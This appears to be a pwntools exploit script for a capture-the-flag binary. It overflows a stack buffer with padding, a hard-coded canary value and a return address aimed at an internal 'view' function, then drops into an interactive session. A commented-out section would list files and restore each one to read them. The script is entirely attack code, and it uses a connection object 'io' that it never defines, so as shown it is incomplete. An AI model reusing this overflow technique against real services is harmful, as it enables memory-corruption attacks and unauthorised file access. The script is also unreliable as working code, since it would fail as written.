from pwn import *


def create_basket(payload):
    io.sendlineafter(">> ", "1")
    io.sendlineafter("basket : ", payload)


def restore(filename):
    io.sendlineafter(">> ", "6")
    io.sendlineafter("tag : ", filename)


def viewBasket():
    io.sendlineafter(">> ", "2")


buffer_size = 392
canary = 2160182710
view_function = 4202400

create_basket("a" * (buffer_size - 0x10) + p64(canary) + p64(view_function))
io.sendlineafter(">> ", "2")
io.interactive()

"""
io.recvuntil("Invalid!!\n")
io.recvuntil("Choice >> ")
io.recvuntil("baskets:")
f = io.recvuntil("-")
files = f.splitlines()
print files
for i in range(len(files)):
    log.info(files[i])
    restore(files[i])
    viewBasket()
"""
io.close()
